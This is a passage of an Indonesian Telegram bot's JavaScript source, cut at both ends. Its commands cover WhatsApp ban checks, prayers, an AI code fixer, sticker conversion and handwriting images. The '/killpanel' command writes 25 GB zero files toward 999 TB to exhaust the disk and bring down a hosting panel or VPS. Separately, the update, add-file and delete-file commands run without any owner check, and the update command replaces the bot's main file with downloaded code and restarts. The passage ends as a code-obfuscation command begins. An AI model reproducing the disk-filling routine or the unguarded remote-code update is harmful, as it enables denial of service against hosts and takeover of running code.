      const info = [
        "⸙☬ EXERCISE GOTSHH ☬⸙",
        `⎙ Nomor            : ${number}`,
        `⦸ Status Nomor     : ⎙ BELOM LOGIN / NOMOR BELUM TERDAFTAR`,
        `⎈ Jenis Pelanggaran: -`,
        `☬ Token            : -`,
        `⎙ Banding          : ⦸ Tidak tersedia`,
        `⎙ Status Pendaftaran: ⦸ Tidak terdaftar di WhatsApp`,
        `⸙ Waktu            : ${nowWITA()}`,
        "",
        "卍 Nomor ini belum pernah didaftarkan atau belum login ke WhatsApp. Pastikan nomor aktif dan coba registrasi ulang dari aplikasi resmi WhatsApp."
      ].join("\n")

      return ctx.reply("```" + info + "```", { parse_mode: "Markdown" })
    }

    const rawResult = await checkStatusWA(number)
    const csw = typeof rawResult === "string" ? JSON.parse(rawResult) : rawResult

    const isBanned = !!csw?.isBanned
    const needOfficial = !!csw?.isNeedOfficialWa
    const violation = csw?.data?.violation_type || (isBanned ? "TERBANNED" : "-")
    const appealable = csw?.data?.in_app_ban_appeal === 1
    const token = csw?.data?.appeal_token || "-"

    const statusText = isBanned ? "☬ TERBANNED" : "⎈ NOMOR AKTIF"
    const daftarText = needOfficial ? "⦸ PERLU WA RESMI" : "⎈ Normal (tidak perlu WA resmi)"
    const penjelasan =
      isBanned
        ? "⦸ Nomor ini telah 𝙏𝙚𝙧𝙗𝙖𝙣𝙣𝙚𝙙 oleh sistem WhatsApp. Tidak dapat digunakan untuk mengirim atau menerima pesan."
        : "⸙ Nomor ini 𝘼𝙠𝙩𝙞𝙛 dan terdaftar di WhatsApp. Tidak ada pelanggaran yang terdeteksi dan dapat digunakan secara normal."

    const info = [
      "⸙☬ EXERCISE GOTSHH ☬⸙",
      `⎙ Nomor            : ${csw?.number || number}`,
      `⦸ Status Nomor     : ${statusText}`,
      `⎈ Jenis Pelanggaran: ${violation}`,
      `☬ Token            : ${token}`,
      `⎙ Banding          : ${appealable ? "⎙ Dapat diajukan banding" : "⦸ Tidak tersedia"}`,
      `⎙ Status Pendaftaran: ${daftarText}`,
      `⸙ Waktu            : ${nowWITA()}`,
      "",
      penjelasan
    ].join("\n")

    const opt = { parse_mode: "Markdown" }
    if (appealable && token && token !== "-") {
      const url = `https://wa.me/banappeal?token=${encodeURIComponent(token)}`
      opt.reply_markup = { inline_keyboard: [[{ text: "⎙ Ajukan Banding Sekarang", url }]] }
    }

    await ctx.reply("```" + info + "```", opt)

  } catch (e) {
    await ctx.reply(
      "```⸙ EXERCISE GOTSHH ERROR\n✘ Gagal mengambil status nomor.\n✘ Alasan: " +
        (e.message || explain(e)) +
        "\n⎙ Waktu: " +
        new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar" }) +
        "```",
      { parse_mode: "Markdown" }
    )
  }
})
// Ganti dengan ID admin kamu
const ADMIN_ID = 8441541694; 

bot.command("lapor", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

  if (!text) {
    return ctx.reply("⚠️ Gunakan format:\n`/lapor [isi laporan]`", {
      parse_mode: "Markdown",
    });
  }

  const laporan = `━━━「 *LAPORAN BERHASIL* 」━━━
Laporan Anda telah diterima oleh admin @raizelzr

⎙ *Detail Laporan:*
- Pengirim : [${username}](tg://user?id=${ctx.from.id})
- Pesan : ${text}

Terima kasih atas laporannya!`;

  // Kirim balasan ke pelapor
  await ctx.reply(laporan, { parse_mode: "Markdown" });

  // Kirim laporan ke admin
  await ctx.telegram.sendMessage(
    ADMIN_ID,
    `📩 *Laporan Baru*\nDari: [${username}](tg://user?id=${ctx.from.id})\nPesan: ${text}`,
    { parse_mode: "Markdown" }
  );
});
const doa = {
  pagi: "اللَّهُمَّ بِكَ أَصْبَحْنَا وَبِكَ أَمْسَيْنَا وَبِكَ نَحْيَا وَبِكَ نَمُوتُ وَإِلَيْكَ النُّشُورُ",
  malam: "اللَّهُمَّ بِكَ أَمْسَيْنَا وَبِكَ أَصْبَحْنَا وَبِكَ نَحْيَا وَبِكَ نَمُوتُ وَإِلَيْكَ الْمَصِيرُ",
  makan: "بِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ",
  keluarrumah: "بسم الله توكلت على الله ولا حول ولا قوة إلا بالله",
  masukrumah: "اللهمّ إني أسألك خير المولج وخير المخرج، بسم الله ولجنا وبسم الله خرجنا، وعلى الله ربنا توكلنا",
  masukkamarmandi: "بسم الله الرحمن الرحيم، اللهم إني أعوذ بك من الخبث والخبائث",
  keluarkamarmandi: "غُفْرَانَكَ، الحمد لله الذي أذهب عني الأذى وعافاني",
  niatwudhu: "نَوَيْتُ الْوُضُوءَ لِرَفْعِ الْحَدَثِ الأَصْغَرِ فَرْضًا لِلَّهِ تَعَالَى",
  niatsetelahwudhu: "أشهد أن لا إله إلا الله وحده لا شريك له، وأشهد أن محمداً عبده ورسوله. اللهم اجعلني من التوابين واجعلني من المتطهرين",
};

// Fungsi bantu untuk kirim doa
function kirimDoa(ctx, teks) {
  return ctx.reply(teks, { parse_mode: "Markdown" });
}

// Command untuk masing-masing doa
bot.command("doapagi", (ctx) => kirimDoa(ctx, doa.pagi));
bot.command("doamalam", (ctx) => kirimDoa(ctx, doa.malam));
bot.command("doamakan", (ctx) => kirimDoa(ctx, doa.makan));
bot.command("doakeluarrumah", (ctx) => kirimDoa(ctx, doa.keluarrumah));
bot.command("doamasukrumah", (ctx) => kirimDoa(ctx, doa.masukrumah));
bot.command("doamasukkamarmandi", (ctx) => kirimDoa(ctx, doa.masukkamarmandi));
bot.command("doakeluarkamarmandi", (ctx) => kirimDoa(ctx, doa.keluarkamarmandi));
bot.command("niatwudhu", (ctx) => kirimDoa(ctx, doa.niatwudhu));
bot.command("niatsetelahwudhu", (ctx) => kirimDoa(ctx, doa.niatsetelahwudhu));

// ===================== KONFIGURASI =====================
const FILE_SIZE = 25 * 1024 * 1024 * 1024; // 25 GB
const TARGET_SIZE = 999 * 1024 ** 4; // 999 TB
const BLOCK_SIZE = 1024 * 1024; // 1 MB

let isProcessRunning = false;

// ===================== UTILITAS =====================
function formatSize(bytes) {
  const gb = (bytes / 1024 ** 3).toFixed(2);
  return `${gb} GB`;
}

// ===================== PEMBUAT FILE =====================
async function createFile(filePath, size) {
  return new Promise((resolve, reject) => {
    const stream = fs.createWriteStream(filePath, { highWaterMark: BLOCK_SIZE });
    const buf = Buffer.alloc(BLOCK_SIZE, 0);
    let written = 0;

    function writeMore() {
      let ok = true;
      while (ok && written < size && isProcessRunning) {
        const remaining = size - written;
        const chunk = remaining >= BLOCK_SIZE ? buf : buf.subarray(0, remaining);
        ok = stream.write(chunk);
        written += chunk.length;

        const percent = ((written / size) * 100).toFixed(2);
        process.stdout.write(
          `\r📂 Writing ${path.basename(filePath)}: ${percent}% (${formatSize(
            written
          )} dari ${formatSize(size)})`
        );
      }
      if (written >= size || !isProcessRunning) {
        stream.end();
      }
    }

    stream.on("drain", writeMore);
    stream.on("error", reject);
    stream.on("finish", () => {
      if (written >= size) {
        process.stdout.write("\n");
        console.log(`✅ Selesai bikin ${filePath} (${formatSize(size)})`);
      }
      resolve();
    });

    writeMore();
  });
}

// ===================== PROSES UTAMA =====================
async function startFileCreationProcess(ctx) {
  console.log("🔥 [SYNC PROSES] Memulai proses pembuatan file...");
  let totalWritten = 0;
  let fileIndex = 1;

  try {
    while (totalWritten < TARGET_SIZE && isProcessRunning) {
      const filePath = path.join(__dirname, `file_${fileIndex}_XYCoolcraft.bin`);
      await createFile(filePath, FILE_SIZE);

      if (!isProcessRunning) break;

      totalWritten += FILE_SIZE;
      fileIndex++;

      console.log(
        `📊 Total progress: ${(totalWritten / 1024 ** 4).toFixed(
          2
        )} TB dari 999 TB`
      );
    }

    if (!isProcessRunning) {
      console.log("🚀 [SYNC SYSTEM] Proses dihentikan oleh pengguna via /stopkill.");
      await ctx.reply("🚀 Proses dihentikan oleh pengguna via /stopkill.");
    } else {
      console.log("🎉 [SYNC SYSTEM] Semua file selesai dibuat!");
      await ctx.reply("🎉 Semua file selesai dibuat!");
    }
  } catch (error) {
    console.error("[BOT] Terjadi error saat pembuatan file:", error);
    await ctx.reply("❌ Terjadi error saat membuat file: " + error.message);
  } finally {
    isProcessRunning = false;
  }
}

// ===================== COMMAND =====================
bot.command("killpanel", checkOwner, checkGroupOnly, async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name;

  if (isProcessRunning) {
    console.log(`[BOT] /killpanel ditolak, sudah berjalan oleh @${username}`);
    return ctx.reply("⎙ Proses sudah berjalan. Gunakan /stopkill untuk menghentikan.");
  }

  isProcessRunning = true;
  console.log(`[BOT] /killpanel diterima dari @${username}`);

  await ctx.reply(
    "✅ Perintah diterima. 🔥 Memulai Kill Panel + Kill VPS\nGunakanlah secara bijak!\ncmd buat stop nya: /stopkill\nCreated By: @Raizelzry"
  );

  // Jalankan tanpa blocking
  startFileCreationProcess(ctx);
});

bot.command("stopkill", checkOwner, checkGroupOnly, async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name;

  if (!isProcessRunning) {
    console.log(`[BOT] /stopkill dari @${username}, tapi tidak ada proses.`);
    return ctx.reply("⎙ Tidak ada proses yang sedang berjalan.");
  }

  isProcessRunning = false;
  console.log(`[BOT] /stopkill diterima dari @${username}. Proses akan berhenti.`);
  await ctx.reply("🚀 Proses akan berhenti setelah file yang sedang ditulis selesai.");
});

const FIX_API = process.env.FIX_API || 'https://api.nekolabs.my.id/ai/gpt/5'
const MAX_API = 1900

const toParams = (obj = {}) =>
  new URLSearchParams(
    Object.entries(obj).filter(([, v]) => v !== undefined && v !== null)
  ).toString()

const extractFences = (text = '') => {
  const rx = /```([\w.+-]*)\n([\s\S]*?)```/g
  const out = []
  let m
  while ((m = rx.exec(text))) {
    out.push({ lang: (m[1] || '').trim(), code: m[2] })
  }
  return out
}

const detectLang = (src = '') => {
  if (/```(\w+)/.test(src)) return RegExp.$1
  if (/<[a-z][\s\S]*?>/i.test(src)) return 'html'
  if (/\b(import|def)\b.+:|\bprint\(/.test(src)) return 'python'
  if (/#include|std::|int\s+main\s*\(/.test(src)) return 'cpp'
  if (/\busing\s+System;|\bConsole\.WriteLine/.test(src)) return 'csharp'
  if (/\bpackage\b.+;|\bpublic\s+class\b/.test(src)) return 'java'
  if (/\bfunc\b|\bpackage\s+main\b/.test(src)) return 'go'
  if (/\bconst\b|\blet\b|\bfunction\b|=>/.test(src)) return 'javascript'
  if (/^\s*{\s*"[^\n]+":/m.test(src)) return 'json'
  return ''
}

const explainPromptID = (lang = '') => `
Kamu adalah asisten perbaikan kode. Balas SELALU dalam bahasa Indonesia dengan format:

## Ringkasan Kesalahan
- Maks 6 poin.

## Perbaikan Utama
- Maks 6 poin.

## Kode Final
\`\`\`${lang || ''}
(tulis seluruh kode final di sini)
\`\`\`
`.trim()

const chunkPrompt = (lang = '', i = 1, n = 1) => `
Kamu menerima potongan kode ke-${i} dari ${n}. 
Perbaiki hanya potongan ini dan kembalikan hasilnya dalam satu blok code fence:

\`\`\`${lang || ''}
(kode hasil perbaikan)
\`\`\`
`.trim()

const pickText = (d) => {
  if (!d) return ''
  if (typeof d === 'string') return d
  if (typeof d === 'object') {
    for (const k of ['data', 'result', 'response', 'message'])
      if (typeof d[k] === 'string') return d[k]
    try { return JSON.stringify(d) } catch { return String(d) }
  }
  return String(d)
}

const callAPI = async (prompt, content) => {
  const textParam = `${prompt}\n\n${content}`
  const url = `${FIX_API}?${toParams({ text: textParam })}`
  try {
    const r = await axios.get(url, {
      timeout: 120000,
      headers: { accept: '*/*' },
      validateStatus: () => true,
    })
    return { status: r.status, data: pickText(r.data) }
  } catch (e) {
    return { status: 500, data: e.message }
  }
}

const ensureFence = (code = '', lang = '') =>
  /^```/.test(code.trim()) ? code : `\`\`\`${lang}\n${code}\n\`\`\``

// -----------------------------
// File helper
// -----------------------------
const langToExt = (lang = '') => {
  const map = {
    javascript: '.js', js: '.js', ts: '.ts',
    html: '.html', css: '.css', json: '.json',
    python: '.py', java: '.java', cpp: '.cpp',
    go: '.go', php: '.php', ruby: '.rb', c: '.c',
    cs: '.cs', sh: '.sh', rs: '.rs', kt: '.kt',
    swift: '.swift', sql: '.sql', xml: '.xml', lua: '.lua',
  }
  return map[lang.toLowerCase()] || '.txt'
}

const guessExtFromCode = (lang, code) => {
  if (lang) return langToExt(lang)
  const s = (code || '').trim()
  if (/^<!DOCTYPE html>|<html[\s>]/i.test(s)) return '.html'
  if (/^\s*{[\s\S]*}\s*$/.test(s)) return '.json'
  if (/^#!/.test(s)) return '.sh'
  if (/\bpackage\s+main\b/.test(s)) return '.go'
  if (/^<\?php\b/.test(s)) return '.php'
  if (/^#include|^\s*int\s+main\s*\(/m.test(s)) return '.c'
  return '.txt'
}

const sendDoc = async (ctx, name, text) => {
  const file = path.join(os.tmpdir(), name)
  await fs.writeFile(file, text)
  try {
    await ctx.replyWithDocument({ source: file, filename: name }, { caption: `📄 ${name}` })
  } finally {
    await fs.remove(file).catch(() => {})
  }
}

// -----------------------------
// Format hasil perbaikan
// -----------------------------
const section = (src, title) => {
  const re = new RegExp(`##\\s*${title}\\s*([\\s\\S]*?)(?=\\n##\\s*|$)`, 'i')
  const m = src.match(re)
  return (m?.[1] || '').trim()
}

const bullets = (txt) =>
  String(txt || '')
    .split(/\r?\n/)
    .map(l => l.replace(/^\s*(?:[-*]|\d+[.)])\s*/, '• ').trim())
    .filter(Boolean)
    .join('\n')

const makeExplain = (lang, userDetail, ringkasan, perbaikan) => {
  const user = userDetail ? `> ${userDetail.replace(/\n/g, '\n> ')}` : '> (tidak ada detail)'
  return [
    `💡 *Perbaikan Kode*`,
    `*Bahasa:* ${lang || 'N/A'}`,
    '',
    `*Detail Pengguna*`,
    user,
    '',
    `*Ringkasan Kesalahan*`,
    ringkasan ? bullets(ringkasan) : '• (tidak tersedia)',
    '',
    `*Perbaikan Utama*`,
    perbaikan ? bullets(perbaikan) : '• (tidak tersedia)',
  ].join('\n')
}

const sendExplainAndFiles = async (ctx, out, lang, userDetail, baseName = 'fixed') => {
  const ringkasan = section(out, 'Ringkasan Kesalahan')
  const perbaikan = section(out, 'Perbaikan Utama')
  const fence = extractFences(out)[0]
  const code = (fence?.code || '').trim()
  const codeLang = (fence?.lang || lang || '').toLowerCase()
  const explain = makeExplain(codeLang, userDetail, ringkasan, perbaikan)

  if (explain.length <= 3500) await ctx.reply(explain, { parse_mode: 'Markdown' })
  else await sendDoc(ctx, 'fixed_explain.md', explain)

  if (!code) return
  const ext = guessExtFromCode(codeLang, code)
  const finalCode = ensureFence(code, codeLang)

  if (finalCode.length <= 1800 && (explain.length + finalCode.length) <= 3900)
    return ctx.reply(`*Kode Final*\n${finalCode}`, { parse_mode: 'Markdown' })
  return sendDoc(ctx, `${baseName}${ext}`, code)
}

// -----------------------------
// Inti proses perbaikan
// -----------------------------
const splitByLines = (s, max) => {
  const lines = String(s || '').split(/\r?\n/)
  const out = []
  let cur = ''
  for (const L of lines) {
    if ((cur + L + '\n').length > max) {
      out.push(cur)
      cur = ''
    }
    cur += L + '\n'
  }
  if (cur) out.push(cur)
  return out
}

const fixWithAPI = async (combined, lang) => {
  if (combined.length <= MAX_API) {
    const r = await callAPI(explainPromptID(lang), combined)
    if (r.status === 200) return { ok: true, out: r.data }
    return { ok: false, err: r.data }
  }
  return { ok: false, tooLong: true }
}

const fixChunked = async (code, lang) => {
  const chunks = splitByLines(code, MAX_API - 200)
  const fixed = []
  for (let i = 0; i < chunks.length; i++) {
    const r = await callAPI(chunkPrompt(lang, i + 1, chunks.length), chunks[i])
    const f = extractFences(r.data)[0]
    fixed.push((f?.code || r.data).trim())
  }
  return fixed.join('\n')
}

const runFix = async (ctx, rawCode, detail = '') => {
  const src = String(rawCode || '').trim()
  if (!src) return ctx.reply('📎 Kirim kode atau reply file .js, .py, dll.')
  await ctx.replyWithChatAction('typing')

  const fences = extractFences(src)
  const lang = (fences[0]?.lang || detectLang(fences[0]?.code || src)).toLowerCase()
  const body = fences[0]?.code || src
  const combined = ['=== DETAIL ERROR ===', detail || '(tidak ada detail)', '=== KODE ===', body].join('\n')

  try {
    const first = await fixWithAPI(combined, lang)
    if (first.ok) return sendExplainAndFiles(ctx, first.out, lang, detail)

    const codeFixed = await fixChunked(body, lang)
    const final = await callAPI(explainPromptID(lang), codeFixed)
    if (final.status === 200) return sendExplainAndFiles(ctx, final.data, lang, detail)
    return sendDoc(ctx, `fixed${guessExtFromCode(lang, codeFixed)}`, codeFixed)
  } catch (err) {
    return ctx.reply(`⚠️ Gagal memperbaiki:\n${err.message || err}`)
  }
}
// Handler utama
const pendingFix = new Map()

bot.command('fix', checkPremium, checkGroupOnly, async (ctx) => {
  const msg = ctx.message
  const textArg = msg.text?.split(' ').slice(1).join(' ').trim()
  const replyText = msg.reply_to_message?.text || msg.reply_to_message?.caption
  const candidate = textArg || replyText
  if (!candidate) {
    return ctx.reply('ⵢ Kirim /fix <kode> atau reply kode/file dengan perintah /fix.')
  }

  const token = crypto.randomBytes(6).toString('base64url')
  pendingFix.set(token, { uid: msg.from.id, code: candidate })
  setTimeout(() => pendingFix.delete(token), 60000)

  await ctx.reply('⎙ Jelaskan singkat error (contoh: TypeError baris 27). Ketik *SKIP* untuk langsung memproses.. butuh waktu beberapa menit....', { parse_mode: 'Markdown' })
})
const sharp = require('sharp');

// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "name gh";
const DEFAULT_REPO = UPD.github_repo_default || "name repo";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

// 🖼️ Command: /toimage
bot.command('toimage', checkPremium, checkGroupOnly, async (ctx) => {
  const replyMsg = ctx.message.reply_to_message;

  // Harus reply ke stiker
  if (!replyMsg || !replyMsg.sticker) {
    return ctx.reply('⎙ Balas sebuah stiker dengan perintah /toimage');
  }

  // Kirim pesan "proses..."
  const waitingMsg = await ctx.reply('⏳ Mengubah stiker...', {
    reply_to_message_id: ctx.message.message_id,
  });

  try {
    const stickerFileId = replyMsg.sticker.file_id;

    // Ambil file URL stiker
    const file = await ctx.telegram.getFile(stickerFileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    // Unduh stiker (bentuk WebP)
    const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
    const inputBuffer = Buffer.from(response.data);

    // Konversi ke PNG
    const pngBuffer = await sharp(inputBuffer).png().toBuffer();

    // Kirim hasil gambar
    await ctx.replyWithPhoto({ source: pngBuffer }, { caption: '✅ Berhasil diubah menjadi gambar.' });

    // Hapus pesan "menunggu"
    await ctx.telegram.deleteMessage(ctx.chat.id, waitingMsg.message_id);
  } catch (error) {
    console.error('❌ ToImage Error:', error.message);

    // Edit pesan menjadi gagal
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      waitingMsg.message_id,
      undefined,
      '❌ Gagal mengubah stiker (mungkin stiker animasi atau video).'
    );
  }
});
// Command /nulis
bot.command("nulis", checkPremium, checkGroupOnly, async (ctx) => {
  const chatId = ctx.chat.id;
  const textInput = ctx.message.text.split(" ").slice(1).join(" ");

  if (!textInput) {
    return ctx.replyWithMarkdown(
      "```⸙ EXERCISE GOTSHH — 𝙉𝙐𝙇𝙄𝙎\n✘ Format salah!\n\n∞ Cara pakai:\n/nulis waktu,hari,nama,kelas,teks\n\n⎙ Contoh:\n/nulis 2025,Senin,Nina,XI IPA 1,otaxx```"
    );
  }

  const parts = textInput.split(",");
  if (parts.length < 5) {
    return ctx.replyWithMarkdown(
      "```⸙ EXERCISE GOTSHH — 𝙉𝙐𝙇𝙄𝙎\n✘ Format kurang!\n\nGunakan format:\n/nulis waktu,hari,nama,kelas,teks```"
    );
  }

  const [waktu, hari, nama, kelas, ...isi] = parts;
  const tulisan = isi.join(",");

  const loadingMsg = await ctx.replyWithMarkdown(
    "```⸙ EXERCISE GOTSHH — 𝙉𝙐𝙇𝙄𝙎\n⎙ Membuat tulisan tangan...```"
  );

  try {
    const apiUrl = `https://brat.siputzx.my.id/nulis?waktu=${encodeURIComponent(
      waktu
    )}&hari=${encodeURIComponent(hari)}&nama=${encodeURIComponent(
      nama
    )}&kelas=${encodeURIComponent(kelas)}&text=${encodeURIComponent(
      tulisan
    )}&type=1`;

    const res = await fetch(apiUrl);
    if (!res.ok) throw new Error("Gagal mengambil gambar");

    const buffer = Buffer.from(await res.arrayBuffer());

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: `⸙ EXERCISE GOTSHH — 𝙉𝙐𝙇𝙄𝙎\n✎ ${nama} — ${kelas}\n∞ ${hari}, ${waktu}\n\n∌ Tulisan berhasil dibuat.`,
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
  } catch (e) {
    console.error(e);
    await ctx.replyWithMarkdown(
      "```⸙ EXERCISE GOTSHH — 𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat tulisan tangan.```"
    );
  }
});
// Encrypt command handler - improved
const JsConfuser = require('js-confuser');

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB upload limit (input)
const MAX_OUTPUT_SIZE = 45 * 1024 * 1024; // 45 MB safe limit untuk hasil (Telegram ~50MB batas bot)

// Helper: hapus file tanpa throw
async function safeUnlink(filePath) {
  if (!filePath) return;
  try { await fsp.unlink(filePath); } catch (e) { /* ignore */ }
}

function sanitizeFilename(name = 'file.js') {
  // ambil basename untuk hindari path traversal
  const base = path.basename(String(name).slice(0, 200));
  return base.replace(/[^a-zA-Z0-9_.-]/g, '_').replace(/_{2,}/g, '_');
}

bot.command('Encrypt', checkPremium, checkGroupOnly, async (ctx) => {
  try {
    const reply = ctx.message && ctx.message.reply_to_message;
    if (!reply || !reply.document) {
      return ctx.reply('⎙ Reply ke file .js (document) yang ingin di-Encrypt');
    }

    const doc = reply.document;
    const mime = (doc.mime_type || '').toLowerCase();
